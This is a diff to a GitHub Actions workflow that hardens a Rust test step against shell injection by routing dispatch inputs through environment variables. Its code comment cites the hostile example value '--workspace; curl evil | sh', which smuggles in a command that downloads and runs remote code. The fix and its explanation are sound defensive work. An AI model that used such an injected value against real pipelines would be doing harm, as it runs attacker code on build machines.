@@ -88,13 +88,22 @@ jobs:
         sudo sysctl -w kernel.core_pattern=/tmp/core.%e.%p || true
 
     - name: Run tests
+      # Both dispatch inputs reach the shell through env rather than `${{ }}`.
+      # `${{ }}` is substituted into the script text before bash parses it, so a
+      # dispatched value of `--workspace; curl evil | sh` would run as a second
+      # command. An expanded variable is only word-split and globbed, never
+      # re-parsed for metacharacters. $TEST_ARGS and $threads are therefore left
+      # unquoted on purpose — both carry several cargo arguments and must split.
+      env:
+        TEST_ARGS: ${{ inputs.test_args }}
+        TEST_THREADS: ${{ inputs.test_threads }}
       run: |
         threads=""
-        if [ -n "${{ inputs.test_threads }}" ]; then
-          threads="-- --test-threads=${{ inputs.test_threads }}"
+        if [ -n "$TEST_THREADS" ]; then
+          threads="-- --test-threads=$TEST_THREADS"
         fi
-        echo "cargo test ${{ inputs.test_args }} $threads"
-        RUST_BACKTRACE=1 cargo test ${{ inputs.test_args }} $threads
+        echo "cargo test $TEST_ARGS $threads"
+        RUST_BACKTRACE=1 cargo test $TEST_ARGS $threads
 
     - name: Build release
       if: inputs.release_build
